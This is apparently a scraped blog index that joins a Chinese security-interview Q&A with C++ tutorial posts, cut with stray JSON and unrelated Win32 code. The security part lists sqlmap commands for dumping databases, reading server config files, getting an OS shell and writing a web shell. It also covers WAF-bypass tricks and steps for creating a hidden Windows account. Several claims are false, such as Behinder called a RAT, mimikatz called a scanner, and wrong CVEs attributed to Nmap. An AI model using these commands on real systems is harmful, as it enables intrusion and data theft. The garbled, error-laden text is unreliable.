总之，SQL盲注是一种危险的攻击手段，开发人员需要采取有效的防御措施，避免出现潜在的漏洞。例如，开发人员可以对用户输入数据进行严格的检验和过滤，限制用户输入的字符类型和长度，尽量避免使用动态拼接字符串的方式构造SQL语句，加强数据库本身的安全性等。 不给你工具，怎么进行webshell排杀要进行Webshell排查和清除，需要在服务器上执行以下步骤： 扫描服务器，寻找异常进程、文件和网络连接。可以使用诸如lsof、netstat、ps等命令来查找可疑的进程和网络连接。 检查服务器中是否存在任何未知文件或目录，特别是具有隐藏属性的文件和目录。可以使用find命令查找所有文件和目录，并检查其中是否存在可疑的文件和目录。 检查服务器上是否存在未知用户和组。可以使用cat /etc/passwd和cat /etc/group命令来查看系统中的用户和组，并检查其中是否存在可疑的用户和组。 检查服务器上的系统日志，包括/var/log/messages、/var/log/secure等文件，以查找异常事件。 如果发现可疑的Webshell文件，需要立即将其删除，并检查相关的网站和数据库是否被入侵。 更新服务器上的操作系统和应用程序，并安装最新的防病毒软件和安全补丁，以提高服务器的安全性。 以上这些操作需要有一定的Linux系统管理基础，如果您不熟悉这些操作，建议联系专业的安全人员进行处理。此外，为了减少Webshell攻击的风险，请您注意加强服务器的安全设置，定期备份重要数据，并限制外部访问服务器的权限。 拿下内网主机如何判断它的权限当您成功入侵一台内网主机后，您需要评估该主机的权限级别。以下是一些常见方法： 查看当前用户的权限：使用命令whoami或id查看当前用户的权限。如果当前用户是root或管理员权限，则他们可以访问和修改系统上所有机密数据和配置文件。 检查可用的系统命令：使用命令sudo -l来查看当前用户是否可以执行以root权限运行的系统命令。如果您有足够的权限，可以使用sudo命令来执行特权操作。 检查系统日志：检查系统日志文件中是否有任何异常记录。攻击者可能会在日志文件中删除其活动痕迹，因此需要查看备份日志文件。 查看安全配置：检查密码策略、防火墙配置、网络访问控制列表等配置文件，以确定当前用户能否绕过这些保护层进行更高级别的攻击。 检查进程和服务：使用命令ps -ef或systemctl list-units来查看正在运行的进程和服务。如果您看到未知的进程或服务正在运行，则可能存在恶意软件或后门程序。 总之，在评估被攻击的内部系统时，重要的是要了解当前用户拥有哪些权限，并确定攻击者是否已经获得更高的权限或在系统上留下了后门。建议在评估过程中使用多种技术和工具来获取完整的信息，以确保您有足够的信息来进行正确的决策，从而保护您的系统和数据免受攻击。 同源策略是什么同源策略（Same Origin Policy）是一种Web安全策略，它是浏览器中的一项重要特性，用于限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。同源指的是三个关键元素：协议、主机和端口号，只有这三者完全相同的两个URL才被认为是同源的。 同源策略可以防止恶意网站访问其他网站的敏感数据，例如Cookie、LocalStorage和请求响应等信息，从而保护用户的隐私和安全。 例如，假设您正在访问一个银行的网站，该银行使用Cookie来存储您的登录凭据。如果攻击者能够在他们的网站上注入一些JavaScript代码并通过某种方式将其转移到您正在访问的银行网站上，那么该攻击者就可以访问您的Cookie，以便窃取您的个人信息。然而，由于同源策略的存在，攻击者无法访问您正在访问的银行网站的Cookie，因为它们不属于同一个源。 尽管同源策略对Web安全至关重要，但在某些情况下，它可能会成为开发过程中的挑战。为了解决这些问题，Web开发人员可以使用一些技术和标记，如跨域资源共享（CORS）和JSONP等来解决这些限制。 说一下几种常见的逻辑漏洞逻辑漏洞指的是应用程序中的编码错误或设计缺陷，使攻击者可以利用不符合预期的逻辑来绕过安全控制并实现攻击目标。以下是几种常见的逻辑漏洞： 注册送礼：在这种攻击中，攻击者通过欺骗用户注册帐户并提供个人信息的方式来获取某种奖励或礼物，从而收集大量有价值的用户数据。攻击者利用了开发人员未正确处理奖励机制的事实，并通过暴力破解、自动化脚本等方式创建大量虚假账户。 提交订单时修改价格：在这种漏洞中，攻击者可以通过提交订单时修改商品价格来获得不当利益。攻击者可能会修改页面上显示的价格、数量或其他参数，以实现价格欺诈。 超额退款：攻击者通过修改应用程序中的退款机制或直接与客户服务联系，以获取超出实际退款金额的退款，从而实现盈利。 非法访问：在这种漏洞中，攻击者可以通过绕过身份验证或访问控制机制，以获取未经授权的访问权限。攻击者可能会使用一些技术手段，如SQL注入、目录遍历、文件包含等来绕过访问控制机制。 不当的会话管理：攻击者可以通过利用应用程序中的会话机制漏洞，以获取受害者的会话令牌或密码。攻击者可能会使用会话劫持、会话固定攻击等技术手段，从而窃取用户的身份验证信息。 以上是常见的几种逻辑漏洞，这些漏洞需要开发人员在设计和编写代码时注意到，并采取相应的防范措施，例如使用安全的会话管理、访问控制、输入验证等措施，从而保护应用程序的安全性。 如何判断是否存在越权漏洞越权漏洞是指攻击者可以未经授权地访问或修改受限资源的漏洞。一些常见的越权漏洞包括： 管理员账户欺骗：攻击者通过伪装成管理员或其他特权用户，以获取访问受限资源的权限。 直接对象引用：攻击者可以直接访问应用程序中的受保护对象或文件，而不需要通过身份验证或授权过程。 会话劫持：攻击者可以窃取正在进行的会话ID，以获得访问受限资源的权限。 暴力破解：攻击者可以使用暴力破解技术，如穷举法或字典攻击等，来尝试猜测受限资源的密码或凭证。 要判断是否存在越权漏洞，可以考虑以下方法： 分析应用程序的访问控制机制，查看哪些资源受到了访问限制。 测试应用程序的身份验证和授权机制，以了解是否存在身份验证缺陷、密码弱点等问题。 使用模拟攻击工具或手动测试来模拟攻击者的行为，并尝试访问受限资源，以确定是否存在越权漏洞。 针对常见的越权漏洞类型，如管理员账户欺骗、会话劫持等，采取相应的安全措施和加固策略。 总之，要发现和修复越权漏洞，需要审查应用程序的访问控制机制、身份验证和授权流程，并通过模拟攻击和手动测试来判断是否存在越权漏洞。定期进行漏洞扫描和安全评估也是必要的，以确保应用程序始终保持安全状态。 sql注入遇到waf，怎么绕过以下是几种常见的方法： 使用编码：攻击者可以对注入负载进行编码，例如使用十六进制或Unicode编码等方式，以绕过WAF对字符集的检查。攻击者还可以使用字符串分割、大小写转换等技术手段，以使WAF无法识别恶意代码。 使用注入器：SQL注入攻击工具如Sqlmap、Havij、SQLi-hunter等，可以自动检测和利用各种SQL注入漏洞，并通过绕过WAF来获取敏感数据。 盲注：在盲注攻击中，攻击者不直接获取查询结果，而是根据应用程序的响应来判断是否存在漏洞。攻击者可以使用时间延迟或错误信息来判断是否存在漏洞，并以此来推断数据库中的数据。 变形注入：变形注入攻击是一种多次执行的注入攻击，使用变体的注入负载，使注入负载不同于以前的攻击负载，从而逃避WAF的检测。 了解过哪些安全设备 华为防火墙：华为防火墙是华为公司生产的安全产品之一，主要用于网络边界安全和数据中心安全。它提供了多种安全功能，例如流量管理、入侵检测、VPN接入等。 绿盟防火墙：绿盟防火墙是北京绿盟科技有限公司开发的一款网络安全产品，具有防御DDoS、DNS攻击、漏洞利用等攻击的能力，还支持大规模分布式部署。 启明星辰边界安全网关：启明星辰边界安全网关是启明信息技术股份有限公司推出的一款综合性安全产品，它能够提供网络访问控制、应用层协议识别、反病毒防护、VPN等多种安全功能。 360天擎安全产品：360天擎安全产品是由360集团推出的综合性安全产品，包括了防火墙、入侵检测、威胁情报、网络行为分析等多种安全功能，可支持大规模企业部署。 安恒安全产品：安恒信息安全技术有限公司是国内知名的网络安全服务提供商之一，其生产的安全产品包括了威胁情报、攻击检测、漏洞管理等多种安全功能，广泛应用于金融、电信、政府等行业。 了解过哪些安全产品 网络安全设备类：网络安全设备类产品主要包括防火墙、入侵检测系统、Web应用安全网关、DDoS防护等。例如华为防火墙、启明星辰边界安全网关、绿盟防火墙、360天擎等。 终端安全类：终端安全产品主要用于保护个人电脑、移动设备和服务器的安全，主要包括反病毒软件、安全加固、数据加密、身份认证等。例如360安全卫士、金山毒霸、腾讯电脑管家等。 数据安全类：数据安全产品主要用于保护企业敏感数据不被泄露或篡改，主要包括加密、备份恢复、数据控制等。例如深信服信息加密解决方案、启明星辰数据加密产品、山石网科数据泄漏防护等。 互联网安全类：互联网安全产品主要用于保护企业在互联网上的各种应用、网站、云服务等安全，主要包括云安全、移动安全、Web应用安全和容器安全等。例如弘善网络云安全解决方案、卫士通移动安全系统、腾讯安全云等。 冰蝎的流量特征是什么冰蝎是一种常见的远控工具(RAT)，其流量特征如下： 使用HTTP协议：冰蝎使用HTTP协议与C&amp;C服务器通信，从而绕过网络策略和防火墙的检测。 自定义加密：冰蝎使用自定义加密算法对数据进行加密，以避免被网络监测器和安全设备检测到。 动态命令: 通过inline和eval函数动态执行指令并返回结果，这使得冰蝎可以运行各种自定义代码，例如扫描目标、下载和安装其他恶意软件等。 内存驻留: 冰蝎不需要在受感染设备上安装文件或建立持久性，它只需要注入进程并在内存中驻留，从而难以被传统杀毒软件检测和清除。 支持多平台：冰蝎支持Windows, Linux, and Mac OS等操作系统，这使得攻击者可以在跨多个平台上远程控制受感染设备。 总之，冰蝎的流量特征是使用HTTP协议、自定义加密、动态命令、内存驻留和支持多平台。网络管理员可以根据这些特征来识别和阻止冰蝎远控攻击。 使用猕猴桃工具需要什么权限猕猴桃是一种常用的网络安全工具，使用该工具需要以下权限： 对目标主机进行扫描：猕猴桃工具需要能够对目标主机或网络进行扫描，以收集有关目标系统和服务的信息。因此，使用者需要有足够的网络访问权限，以便对目标进行扫描和探测。 探测漏洞：猕猴桃工具通过对目标系统和服务进行扫描，并使用已知的漏洞进行测试，从而确定可能存在的安全漏洞。这需要使用者有足够的权限，以便在目标主机上执行相关的漏洞检测工作。 管理目标系统：有时候，为了修复发现的漏洞，需要对目标系统进行配置和管理。这需要使用者拥有足够的管理员权限，以便修改系统设置、安装补丁等。 sqlmap常用命令SQLMap是一种常用的自动化SQL注入攻击工具，可以对目标网站进行全自动的SQL注入漏洞扫描和利用。以下是一些SQLMap的常用命令： 基本扫描命令： 123456PLAINTEXTsqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs # 获取所有可利用的数据库sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname --tables # 获取指定数据库中的所有表sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T tablename --columns # 获取指定表中的所有列sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T tablename -C columnname --dump # 获取指定列中的数据 POST请求和Cookie： 123PLAINTEXTsqlmap -u &quot;http://target.com/login.php&quot; --data=&quot;username=admin&amp;password=1234&quot; --cookie=&quot;PHPSESSID=abcd1234&quot; --level=5 --risk=3 # 向登录页面发送POST请求和Cookie，并对网站进行深度扫描 手动指定注入点： 123PLAINTEXTsqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbms=mysql --technique=T --random-agent --level=5 --risk=3 --current-db --users --passwords --privileges --threads=10 --batch --skip-waf --tamper=randomcomments -p id # 指定注入点为id参数，绕过WAF设置，使用随机HTTP头和注入负载进行扫描 高级命令： 123456PLAINTEXTsqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-shell # 获取操作系统Shellsqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-pwn # 获取操作系统级别的访问权限sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-read=&quot;/var/www/config.php&quot; # 读取指定文件内容sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-write=&quot;/var/www/shell.php&quot; --file-dest=&quot;/var/www/html/&quot; --tamper=&quot;apostrophemask.py&quot; --batch # 向目标服务器写入Web Shell nmap存在什么漏洞Nmap是一种用于网络探测和安全评估的常用工具，不过它本身也存在一些漏洞，以下是一些已公开的Nmap漏洞： CVE-2016-3714: ImageMagick命令注入漏洞 Nmap使用ImageMagick库来处理图像，在旧版本的ImageMagick中存在命令注入漏洞。攻击者可以构造恶意图像文件，通过Nmap执行这些文件的时候触发该漏洞，导致执行任意命令。 CVE-2017-11615：脚本引擎环境变量注入漏洞 Nmap支持在其脚本引擎中执行Lua脚本，而在某些情况下，攻击者可以利用环境变量注入漏洞来执行恶意Lua脚本，从而危及系统安全。 CVE-2018-15173: 路径遍历漏洞 该漏洞存在于Nmap HTTP服务器中，攻击者可以利用此漏洞通过HTTP服务在目标系统上执行任意命令。 需要注意的是，这些漏洞大多数已经被修复，并且很少会对最新版本的Nmap构成威胁。建议用户始终使用最新版本的Nmap，并遵循最佳实践，如限制对Nmap的访问权限，避免使用默认帐户和密码，以及定期更新配置文件等。 nmap常用口令Nmap是一种常用的端口扫描和网络发现工具，可以使用各种方式来扫描目标主机和网络，并检测可用的服务和隐蔽的漏洞。以下是一些常用的Nmap口令： 扫描单个主机： 1234567PLAINTEXTnmap &lt;target_ip&gt; # 扫描指定IP地址nmap &lt;target_hostname&gt; # 扫描指定主机名nmap -p 1-65535 &lt;target&gt; # 扫描所有端口nmap -sV &lt;target&gt; # 扫描目标版本信息nmap -O &lt;target&gt; # 扫描目标操作系统信息 扫描多个主机： 12345PLAINTEXTnmap &lt;subnet&gt; # 扫描子网中的所有主机nmap -iL &lt;targets.txt&gt; # 扫描包含目标主机列表的文件nmap -sP &lt;subnet&gt; # 扫描子网中的所有活动主机（ping扫描） 扫描特定协议： 12345678PLAINTEXTnmap -sT &lt;target&gt; # 使用TCP进行扫描nmap -sU &lt;target&gt; # 使用UDP进行扫描nmap -sS &lt;target&gt; # 使用SYN进行扫描nmap -sA &lt;target&gt; # 使用ACK进行扫描nmap -sF &lt;target&gt; # 使用FIN进行扫描nmap -sX &lt;target&gt; # 使用XMAS进行扫描 扫描选项和指令： 1234567PLAINTEXTnmap -T&lt;level&gt; &lt;target&gt; # 设置扫描速度（0-5，默认为3）nmap --top-ports=&lt;number&gt; &lt;target&gt; # 指定前N个常用端口进行扫描nmap --script=&lt;name&gt; &lt;target&gt; # 使用指定的脚本进行扫描nmap -oA &lt;basename&gt; &lt;target&gt; # 生成三种格式的输出文件（文本、XML、gnmap）nmap -v &lt;target&gt; # 显示详细信息 给你一个ip，你如何溯源到真人 Whois查询：可以通过Whois工具或网站查询IP地址的拥有者和注册信息，包括公司名称、联系人和注册日期等。如果该IP地址属于一个企业或机构，还可以了解其业务性质和所处行业。 端口扫描：使用端口扫描工具（如Nmap）来探测目标主机上开放的服务和端口，从而推断出其所属行业、用途和技术特征等。 元数据分析：通过分析目标网站上的元数据，如网页标题、描述和关键字等，以及抓取页面内容和搜索引擎索引等，可以了解网站的业务性质、所处行业和活动范围等。 社交媒体监测：通过监测目标主机和公司的社交媒体账号，例如微博、LinkedIn和Facebook等，可以获取更多的信息和联系方式，并尝试建立人际关系网络。 正向shell和反向shell的区别是什么正向shell和反向shell都是与远程主机建立命令行连接的工具，可以允许用户执行命令或者进行文件传输等操作。它们的区别在于连接的方向和建立方式： 正向shell 正向shell通常是在目标主机上启动一个服务端程序，等待用户连接并进行身份验证后，允许用户在该主机上执行命令。因此，正向shell需要用户能够直接连接到目标主机，并且需要提供一些身份验证方式来保障安全性。 反向shell 反向shell则是在攻击者主机上启动一个客户端程序，通过网络连接到目标主机并执行指定的命令或脚本。这种方式通常需要绕过防火墙和其他安全措施，利用漏洞或社会工程学技巧获取目标主机的网络访问权限，因此往往会被视为一种黑客攻击技术。 连接不了MySQL数据库站点的原因是什么？连接不上MySQL数据库站点的原因可能有很多，以下是一些可能的原因： 数据库服务未启动或已停止：如果MySQL服务器未正确启动或已停止，就无法连接到该服务。 网络连接问题：如果网络连接不稳定或存在障碍，就可能导致连接失败。例如，防火墙可能会阻止对MySQL端口的访问，或者路由器可能会限制对外部主机的访问。 认证失败：如果提供的用户名和密码无效，则连接将被拒绝。用户必须确保使用正确的凭据进行身份验证。 权限问题：如果用户没有足够的权限来连接到MySQL服务器，就可能会出现连接错误。管理员需要检查和修改授权策略以允许合适的用户访问数据库。 MySQL配置问题：MySQL安装和配置过程中可能存在问题，例如MySQL服务监听错误的网络接口、未正确设置字符集等，这些都可能导致连接失败。 解决连接不上MySQL数据库站点的问题，需要仔细排除以上可能的原因，并逐步调整相关配置或修复故障。同时，建议用户采取相应的安全措施，如加密通信、限制访问权限和实施备份等来保护数据安全。 文件上传的检测点有哪些文件上传是一种常见的Web攻击方式，攻击者可以通过上传恶意文件来获取目标系统的控制权或执行其他恶意行为。以下是一些可能用到的文件上传检测点： 文件类型和扩展名：在上传文件时，应该限制允许上传的文件类型和扩展名，并禁止上传可执行文件和脚本等危险文件，例如.exe、.php、.asp等。 文件大小：应该限制上传文件的大小，以避免恶意用户上传大型文件导致系统资源耗尽，或者上传超过限制大小的文件绕过其他安全措施。 文件内容检查：对于允许上传的文件，应该进行内容检查，确保其中不包含任何恶意代码、无效数据或其他潜在的安全风险。 文件重命名：对于上传的文件，应该使用随机的文件名来避免攻击者对其进行识别和攻击。 路径遍历检查：应该检查上传文件的路径，并防止攻击者利用路径遍历漏洞来上传文件到非预期目录。 权限和访问控制：应该根据用户身份和角色来控制文件上传的权限和访问控制，防止未经授权的用户上传文件并访问到应用程序中的敏感数据。 文件处理和存储：应该将上传的文件存储在安全的位置，并对其进行适当的处理和过滤，例如加密、压缩、解压等操作。同时，应该监测并记录所有的文件上传操作，以便后续的审核和追踪。 常用的外围打点工具有哪些外围打点是一种通过对目标系统进行浅层次的探测，获取其基本信息和漏洞情况等方法。以下是一些常用的外围打点工具： Nmap：Nmap是一款开源的网络探测工具，可以扫描远程主机和端口，并提供许多高级功能，如操作系统检测、服务版本识别和漏洞扫描等。 Masscan：Masscan是一款超快的端口扫描器，可以在短时间内对大量目标主机进行快速扫描，并支持TCP和UDP协议。 Hping：Hping是一款命令行的网络工具，可用于发送自定义数据包和探测目标主机的端口和服务状态。 Netcat：Netcat是一款多功能的网络工具，可用于创建TCP/UDP连接、传输文件、执行shell命令等。 Metasploit：Metasploit是一款渗透测试框架，其中包含了许多漏洞利用模块和扫描功能，可用于快速发现目标系统的弱点并进行攻击。 Nessus：Nessus是一款商业化的漏洞扫描器，可用于检测目标主机和应用程序中的安全漏洞和风险，以及提供修复建议和报告。 描述一下外围打点的基本流程外围打点是一种对目标系统进行浅层次探测的方法，可以帮助安全人员了解目标系统的基本情况和漏洞状况。下面是外围打点的基本流程： 信息收集：在进行外围打点之前，需要先收集相关的信息，包括目标系统的IP地址、域名、开放端口和服务等。可以使用一些工具和技术来收集这些信息，如Whois查询、DNS解析、端口扫描、网络枚举等。 网络探测：在收集到目标系统的基本信息后，可以使用网络探测工具进行扫描，以获取更详细的信息和漏洞情况。常用的网络探测工具包括Nmap、Hping、Netcat等，可以进行端口扫描、协议检测、操作系统识别等。 漏洞扫描：在探测到目标系统的开放端口和服务后，可以使用漏洞扫描工具来检测其中的安全漏洞和风险。常用的漏洞扫描工具包括Nessus、OpenVAS等，可以通过自动化的方式对目标系统进行安全评估和检测，并生成相应的报告和建议。 漏洞利用：在发现目标系统的安全漏洞后，可以使用一些漏洞利用工具进行攻击和渗透测试。常用的漏洞利用工具包括Metasploit、Exploit-db等，可以通过自动化或手动的方式对目标系统进行攻击，并获取相应的权限和访问权。 安全评估：最后，需要对外围打点的结果进行分析和总结，评估目标系统的安全性和风险情况，并提出相应的建议和措施来改善安全状况。 在Windows靶标站点如何建立隐藏用户？ 在Windows靶标站点上，可以通过以下步骤建立隐藏用户： 打开计算机管理器：在Windows菜单中搜索“计算机管理器”，或者在“控制面板”中找到“管理工具”并选择“计算机管理器”。 创建新用户：在计算机管理器中，展开“本地用户和组”，右键单击“用户”文件夹，并选择“新建用户”。在弹出的对话框中输入用户名和密码等信息，然后单击“创建”。 修改注册表：在Windows注册表中添加一个名为“SpecialAccounts”的子项。依次展开“HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts”。如果该子项不存在，则需要手动创建。 添加用户：在“SpecialAccounts”下创建一个名为“UserList”的新项，然后右键选择“DWORD值”并将其命名为新创建的用户账户名称。接着将此项的数值设为0，以使该用户不会被列出在登录界面上。 保存更改：保存所有修改后，注销当前用户或重新启动计算机，隐藏用户将随之生效。 文件包含漏洞的原理和防护？ 文件包含漏洞（File Inclusion Vulnerability）是一种常见的Web应用程序漏洞，攻击者可以利用该漏洞向服务器传递恶意数据或代码，从而获取敏感信息或控制服务器。其原理主要涉及到以下内容： 文件包含方式：Web应用程序通常会使用动态脚本语言（如PHP、ASP等）来动态地生成网页内容。其中，文件包含函数（如include、require等）允许将一个文件的内容嵌入到另一个文件中，以实现模块化和重用性。 用户输入信任：当Web应用程序采用用户输入作为文件路径参数时，如果未对这些参数进行足够的过滤和验证，就可能导致恶意数据或代码被动态地加载到页面中。 恶意代码注入：攻击者可以通过向文件路径参数中注入恶意代码或文件名来触发文件包含漏洞，并在服务器上执行恶意操作。例如，攻击者可以上传一个包含恶意代码的文件，并将其作为文件路径参数传递给目标服务器，从而执行恶意操作。 为了防止文件包含漏洞，需要采取一些安全措施，如下所示： 过滤和验证用户输入：在接收用户输入作为文件路径参数时，必须对其进行过滤和验证，确保其中不包含任何恶意数据或代码。 使用绝对路径而非相对路径：在使用文件包含函数时，应该使用绝对路径而非相对路径，以避免攻击者通过注入如“../”等文件路径跳出当前目录并访问其他文件。 限制访问范围：为了防止攻击者利用文件包含漏洞攻击服务器上的敏感文件，可以通过配置文件访问权限和文件夹安全策略等方式来限制访问范围。 升级和更新软件：Web应用程序中经常会存在许多漏洞和安全风险，因此需要及时升级和更新相关软件和组件，以确保最新的补丁和安全措施已经被采纳。","tags":"护网"},{"title":"c++迭代器常用的辅助函数","url":"/post/8c139f3f.html","text":"xxxxxxxxxx73 1#include 2​3LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);4​5int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)6{7 static TCHAR szAppName[] = TEXT(“MyWindows”); // 注意使用TEXT包裹语句8 HWND hwnd; // 窗口句柄9 MSG msg; // 消息结构10 WNDCLASS wndclass; // 窗口类, 定义窗口基本属性11 wndclass.style = CS_HREDRAW | CS_VREDRAW; // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘12 wndclass.lpfnWndProc = WndProc; // 指定窗口过程(回调函数)13 wndclass.cbClsExtra = 0;14 wndclass.cbWndExtra = 0; // 预留的额外空间, 一般设为015 wndclass.hInstance = hInstance;16 wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); // 设定图标17 wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); // 设定光标18 wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); // 窗口背景色19 wndclass.lpszMenuName = NULL; // 菜单名字20 wndclass.lpszClassName = szAppName; // 窗口类名21​22 if (!RegisterClass(&amp;wndclass)) // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回023 {24 MessageBox(NULL, TEXT(“这个程序需要在Windows NT才能执行!”), szAppName, MB_ICONERROR);25 }26​27 hwnd = CreateWindow(szAppName,28 TEXT(“快乐小凳凳”),29 WS_OVERLAPPEDWINDOW, // 窗口风格30 CW_USEDEFAULT,31 CW_USEDEFAULT,32 CW_USEDEFAULT,33 CW_USEDEFAULT,34 NULL,35 NULL,36 hInstance,37 NULL38 );39​40 ShowWindow(hwnd, iCmdShow);41 UpdateWindow(hwnd);42​43 while (GetMessage(&amp;msg, NULL, 0, 0))44 {45 TranslateMessage(&amp;msg);46 DispatchMessage(&amp;msg);47 }48​49 return msg.wParam;50}51​52LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)53{54 HDC hdc;55 PAINTSTRUCT ps;56 char *str = TEXT(“大家好, 这是我的第一个窗口程序!”);57 RECT rect;58​59 switch (message)60 {61 case WM_PAINT:62 hdc = BeginPaint(hwnd, &amp;ps);63 GetClientRect(hwnd, &amp;rect);64 DrawText(hdc, TEXT(“大家好, 这是我的第一个窗口程序!”), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);65 EndPaint(hwnd, &amp;ps);66 return 0;67 case WM_DESTROY:68 PostQuitMessage(0); // 正式关闭窗口69 return 0;70 }71​72 return DefWindowProc(hwnd, message, wParam, lParam);73}cSTL 中有用于操作迭代器的三个函数模板，它们是： advance(p, n)：使迭代器 p 向前或向后移动 n 个元素 distance(p, q)：计算两个迭代器之间的距离，即迭代器 p 经过多少次 + + 操作后和迭代器 q 相等。如果调用时 p 已经指向 q 的后面，则这个函数会陷入死循环 iter_swap(p, q)：交换容器中两个迭代器指向的位置的值 1234567891011121314151617181920212223#include &lt;list&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; int a[5] = &#123; 1, 2, 3, 4, 5 &#125;; list &lt;int&gt; lst(a, a + 5); list &lt;int&gt;::iterator p = lst.begin(); advance(p, 2); //p向后移动两个元素，指向3 cout &lt;&lt; &quot;1)&quot; &lt;&lt; *p &lt;&lt; endl; //输出 1)3 advance(p, -1); //p向前移动一个元素，指向2 cout &lt;&lt; &quot;2)&quot; &lt;&lt; *p &lt;&lt; endl; //输出 2)2 list&lt;int&gt;::iterator q = lst.end(); // end指向的是最后一个元素的下一个位置 q--; // q 指向 5 cout &lt;&lt; &quot;3)&quot; &lt;&lt; distance(p, q) &lt;&lt; endl; //输出 3)3 iter_swap(p, q); // 交换容器中两个位置的值 cout &lt;&lt; &quot;4)&quot;; for (p = lst.begin(); p != lst.end(); ++p) cout &lt;&lt; *p &lt;&lt; &quot; &quot;; return 0;&#125;","tags":"c++迭代器"},{"title":"C++字符串分割的常用方法","url":"/post/54c3fa40.html","text":"前言参考：strtok_s 函数说明 C++没有python那样的split分割函数，但string.h和string类提供了下列函数方便我们处理字符串 函数与用例1. strtok_s应用：将字符串按照给定字符进行分割 参数： 123456char* strtok_s(char* str, const char* delimiters, char** next_token);/*第一个参数是待分割的字符串第二个参数是指定作为分界线的字符第三个参数是分割剩余的子字符串的存储位置*/ xxxxxxxxxx24 1string str = “dqywy”;2cout &lt;&lt; “转换前：” &lt;&lt; str &lt;&lt; endl;3transform(str.begin(), str.end(), str.begin(), toupper);4cout &lt;&lt; “转换后：” &lt;&lt; str &lt;&lt; endl;5​6// 也可以定义一个新的字符串来接收，修改目标容器起始地址即可，但是字符串长度应该一致7string str = “dqywy”;8string temp = “dqywy99”;9cout &lt;&lt; “转换前：” &lt;&lt; str &lt;&lt; endl;10transform(str.begin(), str.end(), temp.begin(), toupper);11cout &lt;&lt; “转换后：” &lt;&lt; temp &lt;&lt; endl;12​13// 测试返回值14// 过程分析：15// 1. 目标容器temp中的dqywy被修改为DQYWY，99未被覆盖，保持不变16// 2. transform返回temp存储DQYWY后的下一个位置的迭代器，即字符9的指针17string str = “dqywy”;18string temp = “dqywy99”;19string::iterator p; // 字符串迭代器20cout &lt;&lt; “转换前：” &lt;&lt; str &lt;&lt; endl;21p = transform(str.begin(), str.end(), temp.begin(), toupper);22cout &lt;&lt; “转换后：” &lt;&lt; temp &lt;&lt; endl;23cout &lt;&lt; “transform返回值解引用：” &lt;&lt; *p &lt;&lt; endl;24return 0;c++ 注意：第二个参数是const char类型，不要忘记加const；第三个参数是二级指针，不要忘记对一级指针*取地址&amp; 实例： 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123; char str[] = &quot;https-dqywy-top&quot;; // 待分割的字符串 const char delim[] = &quot;-&quot;; // 分割符 char* token; // 存储返回的子字符串 char *next_token = NULL; // 存储未处理的子字符串 // 获取第一个子字符串 token = strtok_s(str, delim, &amp;next_token); // 获取其余子字符串 while (token != NULL) &#123; cout &lt;&lt; token &lt;&lt; endl; // 注意打印应该传token而不是*token，*token是字符，token是字符串的首地址 token = strtok_s(next_token, delim, &amp;next_token); &#125; return 0;&#125; 2. find应用：查找指定子字符串的是否存在及具体位置 参数： 12345size_t find(const string&amp; str, size_t pos = 0) const;/*第一个参数是待查找的子字符串第二个参数是开始匹配的位置*/ 返回值：匹配成功返回子字符串的第一个字符在整个字符串的下标；匹配失败返回string::npos (即-1) 注意：匹配失败返回的string::npos实质上就是-1 实例： 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123; string str = &quot;https-dqywy-top&quot;; int pos = 0; // 起始查找位置 string goal = &quot;dqywy&quot;; // 目标字符串 if ((pos = str.find(goal, 0)) != string::npos) // 即子字符串存在 cout &lt;&lt; &quot;字符串&#x27;dqywy&#x27;第一次出现的位置为：&quot; &lt;&lt; pos &lt;&lt; endl; else cout &lt;&lt; &quot;字符串不存在！&quot; &lt;&lt; endl; pos = 0; // 重置起始查找位置 goal = &quot;ljywz&quot;; // if ((pos = str.find(goal, 0)) != string::npos) // 即子字符串存在 cout &lt;&lt; &quot;字符串&#x27;ljywz&#x27;第一次出现的位置为：&quot; &lt;&lt; pos &lt;&lt; endl; else cout &lt;&lt; &quot;字符串不存在！&quot; &lt;&lt; endl; return 0;&#125; 3. substr应用：获取从指定的起始位置开始，长度为n的子字符串 参数： 12345string substr(size_t pos = 0, size_t n = npos) const;/*第一个参数是起始位置第二个参数是截取的子字符串的长度*/ 返回值：子字符串 注意：起始位置从0开始计算 实例: 123456789101112#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123; string str = &quot;https-dqywy-top&quot;; string sub_str; // 截取字符串 sub_str = str.substr(6, 5); cout &lt;&lt; sub_str &lt;&lt; endl; return 0;&#125;","tags":"c++实用技巧"},{"title":"C++容器种类及常用函数","url":"/post/19b597f8.html","text":"前言参考自： C++中的容器类详解 容器种类 标准容器类 说明 顺序性容器 vector 从后面快速的插入与删除，直接访问任何元素 deque 从前面或后面快速的插入与删除，直接访问任何元素 list 双链表，从任何地方快速插入与删除 关联容器 set 快速查找，不允许重复值 multiset 快速查找，允许重复值 map 一对多映射，基于关键字快速查找，不允许重复值 multimap 一对多映射，基于关键字快速查找，允许重复值 容器适配器 虽然stack和queue中也可以存放元素，但在STL中并没有将其划分在容器的行列，而是将其称为容器适配器，这是因为stack和queue只是对其他容器的接口进行了包装，STL中stack和queue默认使用deque（双端队列） stack 后进先出 